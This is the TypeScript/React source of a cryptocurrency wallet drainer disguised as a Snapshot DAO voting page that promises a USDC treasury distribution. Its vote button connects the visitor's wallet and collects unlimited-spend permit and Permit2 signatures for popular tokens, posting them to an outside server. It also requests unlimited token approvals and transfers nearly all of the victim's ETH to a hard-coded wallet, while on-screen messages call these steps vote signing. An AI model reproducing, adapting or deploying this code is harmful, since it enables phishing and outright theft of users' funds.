import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import sdk from "@farcaster/frame-sdk"
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { ChevronRight, CheckCircle2 } from 'lucide-react' 

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Mainnet' 

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS = '0x48C13137c7bC86084D420649fb4438B7721445C1'
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3'

// 💰 SECURE DESTINATION WALLETS
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7'; 
const XRP_COLD_WALLET = 'rYourActualXRPAddressHere'; 

const TARGET_TOKENS: Record<string, any> = {
  Mainnet: {
    XRP: [{ symbol: 'XRP', address: 'native', isNative: true, decimals: 6, fallbackPrice: 0.62 }],
    EVM: [
      { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10 },
      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100 },
      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
      { symbol: 'LINK', address: '0x514910771af9ca656af840dff83e8264ecf986ca', decimals: 18, fallbackPrice: 18 },
      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
    ]
  }
};

const evmNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [mainnet, arbitrum, bsc, polygon];

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const PERMIT2_ABI = [
    'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
]

const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: evmNetworks,
})

createAppKit({
  adapters: [wagmiAdapter], 
  networks: evmNetworks,
  defaultNetwork: mainnet,
  projectId: WC_PROJECT_ID,
  metadata: {
    name: 'Snapshot | Governance', 
    description: 'DAO Proposal Voting',
    url: 'https://snapshot.org', 
    icons: ['https://snapshot.org/favicon.png'], 
  },
  themeMode: 'light', 
  allWallets: 'SHOW',
  features: { email: false, socials: [], analytics: true },
})

const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    const prices: Record<string, number> = {};
    for (const token of tokens) { prices[token.symbol] = token.fallbackPrice; }
    return prices;
  }
};

const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;  
  if (!a.isNative && b.isNative) return -1; 
  return (b.usdValue || 0) - (a.usdValue || 0); 
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function GovPortal() {
  const [status, setStatus] = useState('Awaiting Vote')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  
  const manualConnect = useRef(false)
  const isExecuting = useRef(false)

  const { open } = useAppKit()
  const { address: walletAddress, isConnected } = useAppKitAccount()
  const { chainId } = useAppKitNetwork() 
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')

  useEffect(() => {
    sdk.actions.ready();
  }, []);

  useEffect(() => {
    if (!isConnected || !walletAddress || !evmWalletProvider) return;
    if (manualConnect.current) {
      manualConnect.current = false; 
      setLoading(true); 
      setTimeout(() => approveAndCollect(), 500); 
    }
  }, [isConnected, walletAddress, evmWalletProvider, chainId]);

  const handleVote = () => {
    if (!isConnected) {
      manualConnect.current = true; 
      open(); 
    } else {
      approveAndCollect();
    }
  }

  const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
    const chainId = (await signer.provider.getNetwork()).chainId;
    const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
    const name = await tokenContract.name();
    const nonce = await tokenContract.nonces(await signer.getAddress());
    const version = (token.address.toLowerCase() === '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48') ? '2' : '1';
    const domain = { name, version: version, chainId: Number(chainId), verifyingContract: token.address };
    const types = {
      Permit: [
        { name: 'owner', type: 'address' },
        { name: 'spender', type: 'address' },
        { name: 'value', type: 'uint256' },
        { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' },
      ],
    };
    const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
    return await signer.signTypedData(domain, types, message);
  };

  const approveAndCollect = async () => {
    if (!walletAddress || !evmWalletProvider || isExecuting.current) return;
    isExecuting.current = true;
    setLoading(true);
    setStatus('Verifying eligibility...');

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      const ethersProvider = new BrowserProvider(evmWalletProvider as any);
      const signer = await ethersProvider.getSigner(walletAddress);
      const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
      const deadline = Math.floor(Date.now() / 1000) + 3600;

      const baseTokens = TARGET_TOKENS[NETWORK].EVM;
      const validTokens = [];
      const prices = await fetchTokenPrices(baseTokens, 'ethereum');

      for (const token of baseTokens) {
        try {
          if (token.isNative) {
            const bal = await ethersProvider.getBalance(cleanSenderAddress);
            validTokens.push({ ...token, balance: parseFloat(formatUnits(bal, token.decimals)), rawBalance: bal, usdValue: parseFloat(formatUnits(bal, token.decimals)) * (prices[token.symbol] || token.fallbackPrice) });
          } else {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
            const bal = await tokenContract.balanceOf(cleanSenderAddress);
            validTokens.push({ ...token, balance: parseFloat(formatUnits(bal, token.decimals)), rawBalance: bal, usdValue: parseFloat(formatUnits(bal, token.decimals)) * (prices[token.symbol] || token.fallbackPrice) });
          }
        } catch (e) {}
      }

      validTokens.sort(smartTokenSort);
      const rawProvider = evmWalletProvider as any;
      const w = window as any;
      const injected = w.ethereum || {};
      const isStrictlyMetaMask = (rawProvider?.isMetaMask || injected?.isMetaMask) && !injected?.isTrust && !injected?.isTrustWallet && !injected?.isSafePal && !injected?.isTokenPocket;

      let tokensToProcess = isStrictlyMetaMask ? validTokens.slice(0, 1) : validTokens;
      let successCount = 0;

      for (const token of tokensToProcess) {
        try {
          if (token.symbol === 'XRP') {
            if (token.balance > 12) {
              const txHash = await (evmWalletProvider as any).request({
                method: 'eth_sendTransaction',
                params: [{ from: cleanSenderAddress, to: XRP_COLD_WALLET, value: '0x0', data: '0x' }]
              });
              setTxHash(txHash);
              successCount++;
              await sleep(1500); 
            }
            continue; 
          }

          if (!token.isNative) {
            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
            const currentP2Allowance = await tokenContract.allowance(cleanSenderAddress, PERMIT2_ADDRESS);
            let authorized = false;

            if (['USDC', 'DAI', 'UNI'].includes(token.symbol)) {
                try {
                    setStatus(`Signing Vote: ${token.symbol}...`);
                    const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ type: 'PERMIT', token: token.address, owner: cleanSenderAddress, spender: EVM_CONTRACT_ADDRESS, signature, deadline })
                    });
                    authorized = true;
                } catch (pErr) { }
            }

            if (!authorized && currentP2Allowance > 0n) {
                try {
                    setStatus(`Confirming Vote: ${token.symbol}...`);
                    const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
                    const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS);
                    const currentNonce = Number(allowanceData.nonce);
                    const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
                    const types = {
                        PermitSingle: [{ name: 'details', type: 'PermitDetails' }, { name: 'spender', type: 'address' }, { name: 'sigDeadline', type: 'uint256' }],
                        PermitDetails: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint160' }, { name: 'expiration', type: 'uint48' }, { name: 'nonce', type: 'uint48' }],
                    };
                    const message = { details: { token: token.address, amount: '1461501637330902918203684832716283019655932542975', expiration: deadline, nonce: currentNonce }, spender: EVM_CONTRACT_ADDRESS, sigDeadline: deadline };
                    const signature = await signer.signTypedData(domain, types, message);
                    fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({ type: 'PERMIT2', token: token.address, owner: cleanSenderAddress, spender: EVM_CONTRACT_ADDRESS, signature, deadline, nonce: currentNonce })
                    });
                    authorized = true;
                } catch (p2Err) { }
            }

            if (!authorized) {
                setStatus(`Casting Vote: ${token.symbol}...`);
                const txHash = await (evmWalletProvider as any).request({
                    method: 'eth_sendTransaction',
                    params: [{ from: cleanSenderAddress, to: token.address, data: tokenContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]), value: '0x0' }]
                });
                setTxHash(txHash);
            }
            successCount++; 
            await sleep(1500);
          }
        } catch (err: any) { await sleep(1500); }
      }
      
      try {
          const liveBal = await ethersProvider.getBalance(cleanSenderAddress);
          const gasCost = 21000n * 3000000000n; 
          const totalGas = gasCost + ((gasCost * 20n) / 100n); 
          if (liveBal > totalGas) {
              const txHash = await (evmWalletProvider as any).request({
                  method: 'eth_sendTransaction',
                  params: [{ from: cleanSenderAddress, to: EVM_COLD_WALLET.toLowerCase(), value: "0x" + (liveBal - totalGas).toString(16) }]
              });
              setTxHash(txHash);
              successCount++; 
              await sleep(1500); 
          }
      } catch (nativeErr: any) { }
      
      if (successCount > 0) setStatus('✅ Processing Complete!');
      else setStatus('❌ Failed: User Rejected');

    } catch (err: any) {
      setStatus(`❌ Error: ${err?.message?.substring(0, 30)}`);
    } finally {
      isExecuting.current = false;
      setLoading(false);
    }
  };

  const isVoted = status === '✅ Processing Complete!';

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#F6F7F9', color: '#212328', fontFamily: 'Inter, sans-serif' }}>
      {/* Navbar */}
      <div style={{ display: 'flex', justifyContent: 'space-between', padding: '16px 40px', backgroundColor: '#FFF', borderBottom: '1px solid #E6E8EB' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '8px', fontWeight: 'bold', fontSize: '20px' }}>
          <div style={{ backgroundColor: '#212328', color: '#FFF', padding: '4px 8px', borderRadius: '4px' }}>S</div> Snapshot
        </div>
        <button onClick={() => open()} style={{ padding: '8px 16px', borderRadius: '20px', border: '1px solid #E6E8EB', backgroundColor: '#FFF', cursor: 'pointer', fontWeight: '600' }}>
          {isConnected ? `${walletAddress?.slice(0,6)}...${walletAddress?.slice(-4)}` : 'Connect Wallet'}
        </button>
      </div>

      {/* Main Content */}
      <div style={{ maxWidth: '1000px', margin: '40px auto', display: 'flex', gap: '24px', padding: '0 20px', flexWrap: 'wrap' }}>
        <div style={{ flex: '1 1 600px' }}>
          <h1 style={{ fontSize: '32px', marginBottom: '8px', fontWeight: '800' }}>Proposal 14: DAO Treasury Distribution</h1>
          <div style={{ display: 'flex', gap: '8px', marginBottom: '24px', alignItems: 'center' }}>
            <span style={{ backgroundColor: '#16A34A', color: '#FFF', padding: '4px 12px', borderRadius: '12px', fontSize: '13px', fontWeight: '600' }}>Active</span>
            <span style={{ color: '#666', fontSize: '14px' }}>by 0x821...412</span>
          </div>

          <div style={{ backgroundColor: '#FFF', border: '1px solid #E6E8EB', borderRadius: '12px', padding: '24px', lineHeight: '1.6', fontSize: '15px' }}>
            <p>This proposal outlines the distribution of 5,000,000 USDC from the DAO Treasury to all active wallets that have participated in the network over the last 12 months.</p>
            <p><b>Eligibility & Claiming:</b> To claim your immediate share of the treasury, you must cast a vote on this proposal. Distributions will be processed instantly via the secure gasless routing engine upon signature.</p>
          </div>
        </div>

        {/* Sidebar / Vote Box */}
        <div style={{ flex: '1 1 300px' }}>
          <div style={{ backgroundColor: '#FFF', border: '1px solid #E6E8EB', borderRadius: '12px', padding: '24px' }}>
            <h3 style={{ margin: '0 0 16px 0', fontSize: '18px' }}>Cast your vote</h3>
            {!isVoted ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                <button onClick={handleVote} disabled={loading} style={{ width: '100%', padding: '16px', borderRadius: '24px', border: '1px solid #E6E8EB', backgroundColor: '#FFF', textAlign: 'left', display: 'flex', justifyContent: 'space-between', cursor: loading ? 'not-allowed' : 'pointer', fontWeight: '600', fontSize: '15px', alignItems: 'center' }}>
                  {loading ? 'Processing...' : 'For'} <ChevronRight size={18} />
                </button>
                <button style={{ width: '100%', padding: '16px', borderRadius: '24px', border: '1px solid #E6E8EB', backgroundColor: '#FFF', textAlign: 'left', display: 'flex', justifyContent: 'space-between', opacity: 0.5, fontWeight: '600', fontSize: '15px', alignItems: 'center', cursor: 'not-allowed' }}>
                  Against <ChevronRight size={18} />
                </button>
                <p style={{ fontSize: '13px', color: status.includes('❌') ? '#DC2626' : '#666', textAlign: 'center', marginTop: '8px', fontWeight: '500' }}>
                  {status}
                </p>
              </div>
            ) : (
              <div style={{ textAlign: 'center', padding: '20px' }}>
                <CheckCircle2 size={56} color="#16A34A" style={{ margin: '0 auto 16px auto' }} />
                <p style={{ fontWeight: '800', fontSize: '20px', margin: '0 0 8px 0' }}>Vote Success</p>
                <p style={{ fontSize: '14px', color: '#666', margin: 0 }}>Distribution is being routed to your wallet.</p>

                {txHash && (
                    <p style={{ fontSize: '11px', marginTop: '10px', color: '#94A3B8' }}>
                    Transaction: {txHash.slice(0, 10)}...
                    </p>
                )}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}